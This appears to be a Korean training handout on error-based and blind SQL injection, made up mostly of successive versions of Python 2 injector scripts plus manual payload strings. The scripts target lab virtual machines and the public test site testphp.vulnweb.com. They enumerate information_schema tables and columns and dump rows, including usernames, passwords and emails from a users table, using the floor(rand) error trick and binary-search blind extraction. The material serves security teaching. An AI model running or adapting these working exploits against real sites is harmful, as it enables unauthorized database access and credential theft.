   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

#rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
rcount = "(select+count(*)+from+information_schema.columns+where+table_name='Employees')"
cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   #query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   query = "(select+column_name+from+information_schema.columns+where+table_name='Employees'+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)
------------------------------------------------------------------
#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/empinfo_id.php" #취약한 URL 주소
   params = "empid=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

table_name = "Employees"
column_name = "FirstName,Salary,HireDate"
#rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" +table_name + "')"
rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   #query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   #query = "(select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
   query = "(select+concat_ws(','," + column_name + ")+from+" + table_name + "+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)

http://testphp.vulnweb.com/

마지막으로 해당 사이트에서 에러베이스 SQL 인젝션 공격 포인트를 식별하고 방금 제작한 인젝터를 이용하여 데이터를 획득해 보시기 바랍니다.

1. 에러 베이스에 적합한 포인트를 찾고, 
2. 수작업으로 에러를 통해서 데이터 획득이 가능한지 분석 및 확인하시고,
3. SQL 인젝터의 구조에 맞게 적용합니다.

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "testphp.vulnweb.com" #가상 머신의 IP주소
   url = "/listproducts.php" #취약한 URL 주소
   params = "cat=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

table_name = "Employees"
column_name = "FirstName,Salary,HireDate"
rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" +table_name + "')"
#rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   #query = "(select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
   #query = "(select+concat_ws(','," + column_name + ")+from+" + table_name + "+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)


substr 추가해서 길이 초과로 구분자가 유실되는 문제를 방지한 인젝터 코드입니다.


#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   delims = "!~!~!"
   domain = "testphp.vulnweb.com" #가상 머신의 IP주소
   url = "/listproducts.php" #취약한 URL 주소
   params = "cat=(select+x+from(select+count(*),concat('" + delims + "'," + query + ",'" + delims +"',floor(rand(0)*2))x+from+information_schema.tables+group+by+x)T)%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   return response.split(delims)[1]

table_name = "users"
column_name = "uname,pass,name,email"
#rcount = "(select+count(*)+from+information_schema.tables+where+table_type='base+table')"
#rcount = "(select+count(*)+from+information_schema.columns+where+table_name='" +table_name + "')"
rcount = "(select+count(*)+from+" +table_name + ")"

cnt = int(httpreq(rcount))
print "count : " + str(cnt)

for i in range(0,cnt):
   #query = "(select+table_name+from+information_schema.tables+where+table_type='base+table'+limit+" + str(i) + ",1)"
   #query = "(select+column_name+from+information_schema.columns+where+table_name='" + table_name + "'+limit+" + str(i) + ",1)"
   query = "(select+substr(concat_ws(','," + column_name + "),1,53)+from+" + table_name + "+limit+" + str(i) + ",1)"
   print "{0:>3}".format(str(i + 1)) + " : " + httpreq(query)

------------------------------------------------------------------------------------------------------
블라인드 sql-injection

select case when ascii(substring('corea',1,1))=97 then 1 else 0 end

select (substring('corea',1,1))

select ascii(substring('corea',1,1));

순차 탐색 기법입니다.

select case when ascii(substring('corea',1,1))=97 then 1 else 0 end

첫번째 글자의 ascii 값이 무엇인지 찾아보기 바랍니다.

select case when ascii(substring('corea',2,1))=111 then 1 else 0 end

select case when ascii(substring('corea',3,1))=114 then 1 else 0 end

이진 탐색기법을 이용하여 첫번째 글자의 ascii 값을 찾아 보세요.

select case when ascii(substring('corea',1,1))>64 then 1 else 0 end

select case when ascii(substring('corea',1,1))>96 then 1 else 0 end

select case when ascii(substring('corea',1,1))>112 then 1 else 0 end

select case when ascii(substring('corea',1,1))>104 then 1 else 0 end

select case when ascii(substring('corea',1,1))>100 then 1 else 0 end

select case when ascii(substring('corea',1,1))>98 then 1 else 0 end

select case (select count(*)from members)>0 then 1 else 0 end

cd /var/www/html/
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap6/user_select.php

문자열 ASCII 변환 예제입니다

금일 교안 공유합니다. 카톡으로 상세하게 기입하려고 했는데 그러지 못하고 있네요.

user_insert.php 다운 받아서. 데이터를 추가 해야만 실습이 가능합니다.

burpsuite 등을 이용하여 파라미터를 확인하고 10번째 테이블의 테이블 명을 Binary Search 방식으로 획득하시기 바랍니다.

id=test'and+(select+ascii(substring(table_name,1,1))from+information_schema.tables+limit+10,1)>70--+

id=test'

id=test'%23

id=test'and+1=1%23

id=test'and+1=2%23

id=test'and+(select+ascii(substring(table_name,1,1))from information_schema.tables+limit+10,1)>80%23

id=test'and+(select+ascii(substring(table_name,3,1))from information_schema.tables+limit+10,1)=79%23

id=test'and+(select+ascii(substring(table_name,4,1))from information_schema.tables+limit+10,1)>63%23

id=test'and+(select+ascii(substring(table_name,4,1))from information_schema.tables+limit+10,1)=66%23

id=test'and+(select+length(table_name)from information_schema.tables+limit+10,1)>16%23 => 몇글자까지 있는지 구하기

16글자로 너무 많네요. 8글자 정도까지만 수작업으로 획득해 보기 바랍니다. 그래야 Blind SQL 인젝터 원리 이해가 가능합니다.

cd /var/www/html
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap8/product_list.php

90번째 테이블의 첫번째 글자를 가져와 보세요.

해당 예제는 조건부 응답 예제입니다.

http://192.168.233.129/product_list.php?category=Confections

select case when 1=1 then 1 else 0 end

select case when 1=2 then 1 else 0 end

select 1 from dual where (select table_name from information_schema.tables limit 1)='a'

limit 1을 뺀다면

select 1 from dual where (select table_name from information_schema.tables)='a'

select case when 1=2 then 1 else 0 (select table_name from information_schema.tables)=1 end

cd /var/www/html
wget https://raw.githubusercontent.com/n3oism/sql/master/examples/chap8/board_list.php

http://192.168.233.129/board_list.php?subject=test%27or+1=2--+

http://192.168.2.17/board_list.php?subject=test%27+and+(case+when+1=1+then+1+else+(select+table_name+from+information_schema.tables)=1+end)=1--+


조건에 따라서 에러 발생하는 쿼리 구조문

http://192.168.2.17/board_list.php?subject=test%27+and+(case+when+(select+ascii(substring(table_name,1,1))from+information_schema.tables+limit+89,1)%3E96+then+1+else+(select+table_name+from+information_schema.tables)=1+end)=1--+
공격 구문까지 추가하였습니다.

Blind SQL 인젝터 입니다.

BooleanOperation 함수 입니다.

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def httpreq(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

rcount = "(select+count(*)+from+information_schema.tables)>100"
print httpreq(rcount)
sys.exit()




------------------------
def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)


-------------------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

rcount = "(select+count(*)+from+information_schema.tables)"
print BinarySearch(1,1024,rcount)
sys.exit()


---------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

rcount = "(select+count(*)+from+information_schema.tables)"
cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))
   for j in range(1,lcount):
      query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      print BinarySearch(1,128,query)
   sys.exit()
   
   
   ----------------------------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

rcount = "(select+count(*)+from+information_schema.tables)"
cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))
   for j in range(1,lcount):
      query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      sys.stdout.write(chr(BinarySearch(1,128,query)))
   sys.exit()
   
   
   --------------------------------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

rcount = "(select+count(*)+from+information_schema.tables)"
cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))
   for j in range(1,lcount):
      query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      sys.stdout.write(chr(BinarySearch(1,128,query)))
   print "" 

---------------------------------------
 lcount = int(BinarySearch(1,128,query_len))+1
-----------------------------------------------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.2.17" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

#rcount = "(select+count(*)+from+information_schema.tables)"
rcount = "(select+count(*)+from+information_schema.columns+where+table_name='Employees')"
cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   #query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   query_len = "(select+length(column_name)+from+information_schema.columns+where+table_name='Employees'+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))+1

   for j in range(1,lcount):
      #query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      query = "(select+ascii(substring(column_name," + str(j) + ",1))from+information_schema.columns+where+table_name='Employees'+limit+" + str(i) + ",1)"
      sys.stdout.write(chr(BinarySearch(1,128,query)))
   print ""
----------------------------------------------   
import time

response = conn.getresponse().read()
time.sleep(0.1)
if(response.find("Chai")>0):

---------------------------------------

#-*- coding: utf-8 -*-
import httplib
import urllib
import sys
import time

def BinarySearch(min, max, query):
   mid = (min + max)/2

   bResult = BooleanOperation(query + ">" + str(mid - 1))
   
   if((max - min)<=1):
      if(bResult):
         return min
      else:
         return max
   
   if(bResult):
      return BinarySearch(mid,max,query)
   else:
      return BinarySearch(min,mid,query)

def BooleanOperation(query):
   headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36", "Content-type": "application/x-www-form-urlencoded", "Accept": "text/html", "Connection": "keep-alive"}

   domain = "192.168.233.129" #가상 머신의 IP주소
   url = "/product_list.php" #취약한 URL 주소
   params = "category=Beverages'+and+1=(" + query + ")%23"

   conn = httplib.HTTPConnection(domain,"80")
   #conn = httplib.HTTPSConnection(domain,"443")
   conn.request("GET",url + "?" + params,None,headers)
   #conn.request("POST",url,params,headers)
   response = conn.getresponse().read()
   time.sleep(0.1)
   if (response.find("Chai")>0):
      return 1
   else:
      return 0

#rcount = "(select+count(*)+from+information_schema.tables)"
rcount = "(select+count(*)+from+information_schema.columns+where+table_name='Employees')"
cnt = int(BinarySearch(1,1024,rcount))

print "count : " + str(cnt)

for i in range(0,cnt):
   #query_len = "(select+length(table_name)+from+information_schema.tables+limit+" + str(i) + ",1)"
   query_len = "(select+length(column_name)+from+information_schema.columns+where+table_name='Employees'+limit+" + str(i) + ",1)"
   lcount = int(BinarySearch(1,128,query_len))+1

   for j in range(1,lcount):
      #query = "(select+ascii(substring(table_name," + str(j) + ",1))from+information_schema.tables+limit+" + str(i) + ",1)"
      query = "(select+ascii(substring(column_name," + str(j) + ",1))from+information_schema.columns+where+table_name='Employees'+limit+" + str(i) + ",1)"
      sys.stdout.write(chr(BinarySearch(1,128,query)))
   print ""
   
   
   
   
